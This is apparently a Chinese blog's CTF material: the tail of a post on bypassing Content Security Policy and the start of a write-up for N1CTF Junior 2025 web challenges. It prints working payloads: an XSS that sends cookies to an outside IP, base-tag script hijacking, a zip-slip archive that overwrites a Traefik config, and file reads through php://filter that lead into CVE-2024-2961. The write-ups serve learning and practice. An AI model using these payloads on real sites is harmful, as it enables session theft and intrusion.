\u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;nonce-2726c7f26c9\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \u0026#39;self\u0026#39; data:; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;h1 id=\u0026#34;flag\u0026#34;\u0026gt;flag{text123}\u0026lt;/h1\u0026gt; index.html（可控页面）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; var iframe = document.createElement(\u0026#34;iframe\u0026#34;); iframe.setAttribute(\u0026#34;src\u0026#34;, \u0026#34;index.html\u0026#34;); iframe.style.display = \u0026#34;none\u0026#34;; // 隐藏 iframe document.body.appendChild(iframe); iframe.onload = function() { setTimeout(function() { var flagElement = iframe.contentWindow.document.getElementById(\u0026#34;flag\u0026#34;); if (flagElement) { console.log(flagElement.textContent); // 输出 flag 内容 } else { console.log(\u0026#34;Flag not found\u0026#34;); } }, 1000); }; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; 最后尝试如下，成功在控制台输出：\n当然也可以弹窗输出。这里加的setTimeout()函数，是为了让index.html文档加载完。需要注意的是，这里必须要在script标签外面套一个body标签，这样才能成功加载，可能的原因如下：\n是因为HTML文档的解析是从上到下执行的，当解析到\u0026lt;script\u0026gt;标签时，会马上执行其中的代码，其实相当于把script放在\u0026lt;body\u0026gt;标签前解析，但是注意我们利用代码中的一步：\n1 document.body 这里其实是调用到了DOM的一个对象，此时并没有完成初始化，必须要将其放在\u0026lt;body\u0026gt;标签中，简单给个代码对比一下：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;body\u0026gt; \u0026lt;script\u0026gt; alert(document.body); // 输出 \u0026lt;body\u0026gt; 元素 \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; alert(document.body); // 输出 null \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;\u0026lt;/body\u0026gt; 结果如上，简单理解一下就行。\n如果可以的话，可以尝试直接写iframe标签的代码，不用再用js代码来构造：\n1 \u0026lt;iframe src=\u0026#34;index.html\u0026#34; title=\u0026#34;iframe Example\u0026#34; width=\u0026#34;400\u0026#34; height=\u0026#34;300\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 这样就直接获取到了内容：\n需要注意的是：这里的src可以是一个url。\n利用场景：\n两个页面，其中一个页面可控，并且存在XSS漏洞，这样可访问存在CSP的页面的内容。\n这个标签还有很多技巧，比如它的srcdoc属性等。可以看下面的例题分享。\n对于\u0026lt;iframe\u0026gt;标签。还有的比较有意思的点可以看看如下文章：\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-sandbox\nCDN绕过 一般前端都会用到许多的前端框架和库，简单来说其实就是有些前端会应用其他CDN上的JS框架，但是如果引用的CDN的框架存在什么自定义的标签或其他定义，可以获取cookie等操作，那么此时我们就可以利用这个CDN来绕过CSP。\n但是这个的绕过就一般需要找历史漏洞，或者是挖一个0day出来，简单记录一下：\n如果用了Jquery-mobile库，且CSP中包含script-src 'unsafe-eval或者script-src 'strict-dynamic'，可以用此exp：\n1 \u0026lt;div data-role=popup id=\u0026#39;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#39;\u0026gt;\u0026lt;/div\u0026gt; blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库：\n《Breaking XSS mitigations via Script Gadgets》\n还有RCTF2018的AMP题出现了这个的利用。主要还是因为AMP自己提供的组件：\u0026lt;amp-pixel\u0026gt;。可以获取到cookie并向指定的网址发送请求。\n简单说说自己的理解，题目docker有点问题，就没有拉起来试试怎么打了：\nCSP限制为：\n1 script-src \u0026#39;nonce-88f68fa5b7eb8a01de8b8e63b5fb0a6e\u0026#39; \u0026#39;strict-dynamic\u0026#39;; style-src \u0026#39;unsafe-inline\u0026#39; 可以看到对script进行了限制，然后对style-src进行了限制，但是这里没有对img-src进行限制，然后没有定义default-src，这里个人认为的可能的原因是这个\u0026lt;amp-pixel\u0026gt;组件是由img-src来定义的：\n最后的payload如下：\n1 \u0026lt;amp-pixel src=\u0026#34;https://foo.com/pixel?cid=CLIENT_ID(site-user-id-cookie-fallback-name)\u0026#34;\u0026gt;\u0026lt;/amp-pixel\u0026gt; 其他的说明具体参考如下官方文章说明：\n《Analytics: the basics》\n——————\n可以去看看这道题的wp。\nBase-uri绕过 base-uri的绕过，在RCTF2018 rBlog的非预期解，没找到docker，这里就简单讲讲理解。以及wp中的有意思的点。\n这里提到了一个base-uri，这是一个控制\u0026lt;base\u0026gt;标的CSP指令，对于\u0026lt;base\u0026gt;标签的定义，可以知道的是：\n为页面上的所有的相对链接规定默认URL或默认目标，也就是说会将比如\u0026lt;script\u0026gt;、\u0026lt;a\u0026gt;等标签里指向的相对URL都会指向\u0026lt;base\u0026gt;标签中的相对URL。 必须位于\u0026lt;head\u0026gt;元素内部，一般是靠前的部分。 一个文档只有一个\u0026lt;base\u0026gt;标签（非常重要，如果不能覆盖掉原有的，那么就不能利用了） 简单解释一下\u0026lt;base\u0026gt;标签的使用规则：\n1 2 3 4 \u0026lt;head\u0026gt; \u0026lt;base href=\u0026#34;//vps_ip/\u0026#34;\u0026gt; \u0026lt;script nonce=\u0026#39;test\u0026#39; src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; 如上设置，那么\u0026lt;script\u0026gt;加载js文件时就会去访问 http://vps_ip/app.js。所以如果想要利用的话，需要在自己的vps上创建一个同名文件，放进js代码即可。\n但是本地测试如下发现：\n1 2 3 4 5 6 7 8 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;base href=\u0026#34;//47.100.223.173/\u0026#34;\u0026gt; \u0026lt;script nonce=\u0026#39;test\u0026#39; src=\u0026#34;app.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这样在\u0026lt;body\u0026gt;中还是能加载到app.js？辩证看待吧。并且需要注意的是，应该是解析顺序的原因，这里需要要利用的\u0026lt;script\u0026gt;标签是在\u0026lt;base\u0026gt;标签下面。\n对于base-uri，如下解释文章：\n《CSP: base-uri》\n里面提到了一个很有意思的点：\ndefault-src，也就是前面提到的，当我们并没有显式地定义一个指令，那么此时就会直接回落这个default-src定义的内容。这个是非常重要的利用点。\n除了base-uri，还有其他如form-action、frame-ancestors等指令。\n所以这个方法的利用条件：\n能在\u0026lt;head\u0026gt;中插入\u0026lt;base\u0026gt;标签 能执行的\u0026lt;script\u0026gt;标签一定至少满足script-src中的一个条件 没有显式设置base-uri 页面引用存在相对路径的\u0026lt;script\u0026gt;标签 RCTF的CSP限制如下：\n1 Content-Security-Policy: default-src \u0026#39;none\u0026#39;; script-src \u0026#39;nonce-720f7efdee4d8940dc71ef5190d6f266\u0026#39;; frame-src https://www.google.com/recaptcha/; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; fonts.googleapis.com; font-src fonts.gstatic.com; img-src \u0026#39;self\u0026#39; 此时可以用 CSP Evaluator 网站简单检测一下：\n可以打base-uri，具体的原理其实就是前面说的，在标题处插入\u0026lt;base\u0026gt;，然后通过加载js文件来打。\n这道题的wp如下文章比较详细：\nhttps://blog.cal1.cn/post/RCTF%202018%20rBlog%20writeup\nCRLF绕过 HCTF2018的一道题，当一个页面存在CRLF漏洞时，并且可控点在CSP上方，那么就可以通过换行，将CSP挤到HTTP返回体中，这样来绕过CSP。\n这里主要的利用手法是，前面说了的，如果是使用\u0026lt;meta\u0026gt;标签，需要在\u0026lt;head\u0026gt;中来定义，并且在\u0026lt;body\u0026gt;中的CSP设置是会被忽略的。\n具体利用就网上搜wp看吧。\n题目地址：https://github.com/Lou00/HCTF2018_Bottle，但是有点老了，docker拉不起来，没搭环境复现。\n————————\n等还有很多绕过方式，这里就不多说了，具体可以看参考文章中的先知社区的文章，还是比较全面的。\n例题分享 Tagless SekaiCTF 2024 的题，题目环境：https://github.com/project-sekai-ctf/sekaictf-2024?tab=readme-ov-file\n——————\n开题如下：\n无标签显示器，尝试往里面插入标签，没有显示。看了一下插入位置，是在\u0026lt;body\u0026gt;中。给docker源代码，直接开审。感觉是一个XSS。\nap.py文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 from flask import Flask, render_template, make_response, request from bot import * from urllib.parse import urlparse app = Flask(__name__, static_folder=\u0026#39;static\u0026#39;) @app.after_request def add_security_headers(resp): resp.headers[ \u0026#39;Content-Security-Policy\u0026#39;] = \u0026#34;script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://unpkg.com \u0026#39;unsafe-inline\u0026#39;; font-src https://fonts.gstatic.com;\u0026#34; return resp @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#34;/report\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def report(): bot = Bot() url = request.form.get(\u0026#39;url\u0026#39;) if url: try: parsed_url = urlparse(url) except Exception: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid URL.\u0026#34;}, 400 if parsed_url.scheme not in [\u0026#34;http\u0026#34;, \u0026#34;https\u0026#34;]: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid scheme.\u0026#34;}, 400 if parsed_url.hostname not in [\u0026#34;127.0.0.1\u0026#34;, \u0026#34;localhost\u0026#34;]: return {\u0026#34;error\u0026#34;: \u0026#34;Invalid host.\u0026#34;}, 401 bot.visit(url) bot.close() return {\u0026#34;visited\u0026#34;: url}, 200 else: return {\u0026#34;error\u0026#34;: \u0026#34;URL parameter is missing!\u0026#34;}, 400 @app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; if __name__ == \u0026#39;__main__\u0026#39;: app.run(debug=True) 可以看到这里有设置csp限制，先拿去CSP评估网站评估一下：\n一个object-src，控制插件的一个指令，但是这里用不了。继续审，在report路由，可以发现是一个让bot来访问的操作。看一下bot.py文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 from selenium import webdriver from selenium.webdriver.chrome.options import Options import time class Bot: def __init__(self): chrome_options = Options() chrome_options.add_argument(\u0026#34;--headless\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-gpu\u0026#34;) chrome_options.add_argument(\u0026#34;--no-sandbox\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-dev-shm-usage\u0026#34;) chrome_options.add_argument(\u0026#34;--disable-extensions\u0026#34;) chrome_options.add_argument(\u0026#34;--window-size=1920x1080\u0026#34;) self.driver = webdriver.Chrome(options=chrome_options) def visit(self, url): self.driver.get(\u0026#34;http://127.0.0.1:5000/\u0026#34;) self.driver.add_cookie({ \u0026#34;name\u0026#34;: \u0026#34;flag\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;SEKAI{dummy}\u0026#34;, \u0026#34;httponly\u0026#34;: False }) self.driver.get(url) time.sleep(1) self.driver.refresh() print(f\u0026#34;Visited {url}\u0026#34;) def close(self): self.driver.quit() 可以看到在其中的visit()访问时，是带上了flag的，并且将httponly设置为了false，同时需要注意，这里可以看出来是使用的Google引擎。\n那么基本思路就是获取cookie，现在就是看怎么进行利用。\n看一下前端处理渲染的app.js代码，其中看到了一个过滤函数：\n1 2 3 4 function sanitizeInput(str) { str = str.replace(/\u0026lt;.*\u0026gt;/igm, \u0026#39;\u0026#39;).replace(/\u0026lt;\\.*\u0026gt;/igm, \u0026#39;\u0026#39;).replace(/\u0026lt;.*\u0026gt;.*\u0026lt;\\/.*\u0026gt;/igm, \u0026#39;\u0026#39;); return str; } 贪婪匹配，替换为空，基本上过滤完了，但是看出来都是匹配的整个\u0026lt;\u0026gt;标签，这里可以使用\u0026lt;img\u0026gt;标签来进行引入，让其自动匹配\u0026gt;（注意这里要看懂app.js的渲染才好懂）：\n看此时的前端，可以发现应是浏览器自动补足了缺失的\u0026lt;/body\u0026gt;标签：\n但是暂时利用不了，继续看。注意看app.py文件中的404处理过程：\n1 2 3 4 @app.errorhandler(404) def page_not_found(error): path = request.path return f\u0026#34;{path} not found\u0026#34; 处理404页面时，会直接在将路径打印在页面上？\n确实会，那么在这里就可以插入任意的js标签，比如：\n确实解析了，但是并没有执行js解析。此时看到控制台报错：\n这个是被CSP限制了，这里才注意到源代码中的CSP的设置是全部路由：\n1 2 3 4 5 @app.after_request def add_security_headers(resp): resp.headers[ \u0026#39;Content-Security-Policy\u0026#39;] = \u0026#34;script-src \u0026#39;self\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com https://unpkg.com \u0026#39;unsafe-inline\u0026#39;; font-src https://fonts.gstatic.com;\u0026#34; return resp 前面忘了，以为是只有index才能。\n所以需要绕一下这个csp，看了一下别人的wp，这里的绕过方法非常精妙呀，这里利用的是\u0026lt;script\u0026gt;标签的src属性，当我们指定src后，引入js文件时就会拼接上路径然后访问，比如\n1 \u0026lt;script src=\u0026#34;/1.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 那么引入的文件时发送的请求是http://hostname/1.js，参考文章：https://blog.csdn.net/festone000/article/details/112030241 。\n那么在这里，我们就额可以尝试来构造一下404页面，从而来绕过，但是需要注意的是，有脏数据，比如我们指定访问/alert(1)文件，那么此时的“文件”内容为：\n想要这里的代码正确，需要绕一下。比如前面的/，我们就可以加一个**/来构造多行注释的效果，然后后面的就使用//来单行注释掉即可，最后成功弹窗：\n哇，原来src引入的js文件，如果是本地文件，那么同样是拼接到url上去访问获取内容的，有意思有意思。\n那么现在就可以尝试获取cookie，无httponly，直接外带：\n1 \u0026lt;script%20src=\u0026#34;/**/fetch(`http://47.100.223.173:2333?cookie=${document.cookie}`)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 本地试了一下，edge、firefox和google都能解析，但是就是打不通只能改payload了：\n1 \u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 然后传参：\n这个就打出来了：\n服了，又在这个细节点卡了很久。\ndisplay N1CTF Junior 2025的题，具体看我另一篇文章：\nhttps://fupanc-w1n.github.io/p/n1ctf-junior-2025/#display\n参考wp：\nhttps://hackmd.io/@Whale120/HJ_rpvujC\nhttps://siunam321.github.io/ctf/SekaiCTF-2024/Web/Tagless/\nhttps://www.justus.pw/writeups/sekai-ctf/tagless.html\n知识点参考文章：\nhttps://www.cnblogs.com/kinyoobi/p/15341248.html\nhttps://juejin.cn/post/7426954121309356042#heading-5\nhttps://xz.aliyun.com/news/4716\nhttps://xz.aliyun.com/news/6968\n","date":"2025-02-17T00:52:17+08:00","permalink":"https://fupanc-w1n.github.io/p/%E6%B5%85%E8%B0%88csp%E7%BB%95%E8%BF%87/","title":"浅谈CSP绕过"},{"content":"WEB Gavatar 题目给了docker附件，是php代码。简单看了一下web应用，就是一个注册+登录操作，然后可以上传头像。然后就是审计代码：\n简单贴几个代码出来：\nregister.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] !== \u0026#39;POST\u0026#39;) { header(\u0026#39;Location: index.php\u0026#39;); exit; } $username = $_POST[\u0026#39;username\u0026#39;] ?? \u0026#39;\u0026#39;; $password = $_POST[\u0026#39;password\u0026#39;] ?? \u0026#39;\u0026#39;; if (empty($username) || empty($password)) { header(\u0026#39;Location: index.php?error=Invalid input\u0026#39;); exit; } if (findUserByUsername($username)) { header(\u0026#39;Location: index.php?error=Username already exists\u0026#39;); exit; } $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; $db = getDb(); $db[\u0026#39;users\u0026#39;][] = $user; saveDb($db); $_SESSION[\u0026#39;user_id\u0026#39;] = $user[\u0026#39;id\u0026#39;]; header(\u0026#39;Location: profile.php\u0026#39;); upload.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; highlight_file(__FILE__); $user = getCurrentUser(); if (!$user) header(\u0026#39;Location: index.php\u0026#39;); $avatarDir = __DIR__ . \u0026#39;/avatars\u0026#39;; if (!is_dir($avatarDir)) mkdir($avatarDir, 0755); $avatarPath = \u0026#34;$avatarDir/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } header(\u0026#39;Location: profile.php\u0026#39;); common.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 \u0026lt;?php session_start(); function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } function getDb() { $dbPath = __DIR__ . \u0026#39;/../db/db.json\u0026#39;; if (!file_exists($dbPath)) { file_put_contents($dbPath, json_encode([\u0026#39;users\u0026#39; =\u0026gt; []])); } return json_decode(file_get_contents($dbPath), true) ?: [\u0026#39;users\u0026#39; =\u0026gt; []]; } function saveDb($data) { file_put_contents(__DIR__ . \u0026#39;/../db/db.json\u0026#39;, json_encode($data, JSON_PRETTY_PRINT)); } function findUserByUsername($username) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;username\u0026#39;] === $username) return $user; } return null; } function getCurrentUser() { return isset($_SESSION[\u0026#39;user_id\u0026#39;]) ? findUserById($_SESSION[\u0026#39;user_id\u0026#39;]) : null; } function findUserById($id) { $db = getDb(); foreach ($db[\u0026#39;users\u0026#39;] as $user) { if ($user[\u0026#39;id\u0026#39;] === $id) return $user; } return null; } avatar.php：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 \u0026lt;?php require_once \u0026#39;common.php\u0026#39;; $user = isset($_GET[\u0026#39;user\u0026#39;]) ? findUserByUsername($_GET[\u0026#39;user\u0026#39;]) : null; $defaultAvatar = __DIR__ . \u0026#39;/images/default-avatar.png\u0026#39;; if (!$user) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); exit; } $avatarPath = __DIR__ . \u0026#34;/avatars/{$user[\u0026#39;id\u0026#39;]}\u0026#34;; if (!file_exists($avatarPath)) { header(\u0026#39;Content-Type: image/png\u0026#39;); readfile($defaultAvatar); } else { header(\u0026#39;Content-Type: \u0026#39; . mime_content_type($avatarPath)); readfile($avatarPath); } 审计代码，简单说说逻辑吧，注册时会随机生成强随机的id，然后将其写入到db.json文件中，并且上传的文件会重命名并移动到avatars目录下。在upload.php中，如下代码：\n1 2 3 4 5 6 7 8 9 10 11 if (!empty($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;])) { $finfo = new finfo(FILEINFO_MIME_TYPE); if (!in_array($finfo-\u0026gt;file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;]), [\u0026#39;image/jpeg\u0026#39;, \u0026#39;image/png\u0026#39;, \u0026#39;image/gif\u0026#39;])) { die(\u0026#39;Invalid file type\u0026#39;); } move_uploaded_file($_FILES[\u0026#39;avatar\u0026#39;][\u0026#39;tmp_name\u0026#39;], $avatarPath); } elseif (!empty($_POST[\u0026#39;url\u0026#39;])) { $image = @file_get_contents($_POST[\u0026#39;url\u0026#39;]); if ($image === false) die(\u0026#39;Invalid URL\u0026#39;); file_put_contents($avatarPath, $image); } 在这个elseif条件中，可以看到是存在文件读取然后文件写入的操作的，但是如果想要访问，最终的基于点都是需要知道这个id，这里我想了一下，是否能够通过覆盖掉id来进行尝试，两个地方，一个是在json文件中尝试，还有一个是在register.php文件中尝试：\n1 2 3 4 5 $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; password_hash($password, PASSWORD_DEFAULT) ]; 但是在注册后写入json文件时，采用的是json_encode($data, JSON_PRETTY_PRINT)结构，这里是会将特殊符号转义的，所以并不能进行。还有一个就是第二个，经测试，是可以进行覆盖的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;?php function generateUuid() { return sprintf( \u0026#39;%04x%04x-%04x-%04x-%04x-%04x%04x%04x\u0026#39;, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000, mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff) ); } //$username=\u0026#34;\u0026#39;123\u0026#39;,\u0026#39;id\u0026#39; =\u0026gt; \u0026#39;123\u0026#39;,\u0026#34;; $user = [ \u0026#39;id\u0026#39; =\u0026gt; generateUuid(), \u0026#39;username\u0026#39; =\u0026gt; \u0026#34;admmm\u0026#34;, \u0026#39;id\u0026#39; =\u0026gt; \u0026#34;1111\u0026#34; ]; echo $user[\u0026#34;id\u0026#34;]; //output：1111 这样是可以进行的。但是，在传参解析时，只会将其设定为一个值。不可能通过一个简单的传参来更改后端的逻辑。\n所以只能找其他的地方。最后在avatar.php文件中发现突破点。就简单说说逻辑吧，具体代码回去看。就是通过传参username的值，从db.json文件中获取到整个user的结构（包括id等），然后再获取到id，拼接到avatar来读取文件，然后调用了readfile()读取这个文件，其实就是上传头像后查看头像的功能。只是改了一下逻辑，不是简单的直接访问路径查看，所以这里时可以拿到文件内容的，尝试如下：\n前端要求必须为网址，直接用file协议读就行，读取文件：\n然后查看头像内容：\n成功读取。\n给了docker文件，可以知道是需要命令执行readflag的。有回显，调用文件处理函数，php版本为:\n直接打CVE-2024-2961，但是需要注意session的问题。记着Session()会自动保存cookie，然后我就在改脚本，一直没改出来，最后改了如下位置：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; cookie = {\u0026#34;username\u0026#34;: \u0026#34;fupanc\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123\u0026#34;} self.session.post(\u0026#34;http://localhost:8000/register.php\u0026#34;, data=cookie) # cookie = {\u0026#34;username\u0026#34;:\u0026#34;fupanc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;} # self.session.post(\u0026#34;http://localhost:8000/login.php\u0026#34;,data=cookie) return self.session.post(self.url, data={\u0026#34;url\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://localhost:8000/avatar.php?user=fupanc\u0026#34;) data = response.re.search(b\u0026#34;(.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) 然后打就行了：\n最后访问flag.txt得到flag：\n这里很服的一点是，审代码确实是审出来可以直接在register.php获取到cookie，但是一直打不出来，后面复现的时候发现，就是因为我想要让端口更多元，没有使用docker-compose，导致一直打不出来：\n最后尝试使用docker-compose才打出来的。没错！就是在register.php就可以获取到cookie。\n——————\ntraefik go语言，同样给了源代码。简单审计一下，直接在flag路由就可以获取到flag了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 r.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) 有请求头检测，伪造一下就行。但是直接访问发现是404。那么继续审代码可以发现是文件上传+unzip，想到了zip slip，可以任意文件覆盖，审计源码，在unzip时使用的jion()函数：\n可以目录穿越尝试覆盖文件，就是打zip slip了，如下文章：\nhttps://saucer-man.com/information_security/364.html\n直接用里面的脚本就行。但是现在需要看在哪里覆盖文件，经过搜索以及翻和审计docker文件，发现traefik就是一个反代理工具，并且通过dynamic.yml文件来进行路由流量的转接：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy 可以看到这里是没有放行flag路由的。那么就需要尝试伪造一下，注意看这里的注释可以知道是动态配置的，那么就是unzio时解压来覆盖dynamic.yml达到允许flag路由通过的效果。\n最开始是直接仿造到上面这个改改就行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy 成功覆盖后可以访问flag路由了，尝试直接在请求头中用XFF来伪造。但是始终获取不到flag。后面就想，是不是这个traefik工具是不是不会转发原请求头的内容，可以自己改一下go的源码来讲请求头打印出来，最后发现确实是：\n会自动转发真实ip。\n打的话，生成文件用下面这个脚本就行：\n1 2 3 4 5 6 7 import zipfile # the name of the zip file to generate zf = zipfile.ZipFile(\u0026#39;out.zip\u0026#39;, \u0026#39;w\u0026#39;) # the name of the malicious file that will overwrite the origial file (must exist on disk) fname = \u0026#39;dynamic.yml\u0026#39; #destination path of the file zf.write(fname, \u0026#39;../../.config/dynamic.yml\u0026#39;) 有docker，看一下目录结构就知道怎么穿了，或者直接多几个../穿到根目录然后覆盖/app/.config/dynamic.yml就行。\n————\n搜一下覆盖请求头，可以拿到如下文章：\nhttps://www.azfum.com/archives/wswfale/\n里面就提到了可以覆盖请求头，用middlewares:就行，所以使用的dynamic.yml：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - xff-rewrite middlewares: xff-rewrite: headers: customRequestHeaders: X-Forwarded-For: \u0026#34;127.0.0.1\u0026#34; 生成zip文件后，上传：\n解压成功：\n最后再访问flag路由即可：\n拿到flag。\nbackup 简单得RCE ————————\n这道题没有docker，简单创了一个docker环境来测试，打的时候棋差一招呀，没找对选项。具体看wp吧。\n一开始看页面源代码看到命令执行的地方$_REQUEST[\u0026quot;__2025.happy.new.year\u0026quot;]，非法参数名问题，post传参就行：_[2025.happy.new.year，直接bash弹个shell，原文件的外面套的system()函数，所以直接传命令就行了（hackbar传参的话需要url编码再传）：\n这里的/flag是400权限，需要提权。\n根目录有一个/backup.sh 文件，文件内容为：\n1 2 3 4 5 6 7 8 9 #!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done sh文件内容就不多说了，每隔一段时间就会运行一次，ps 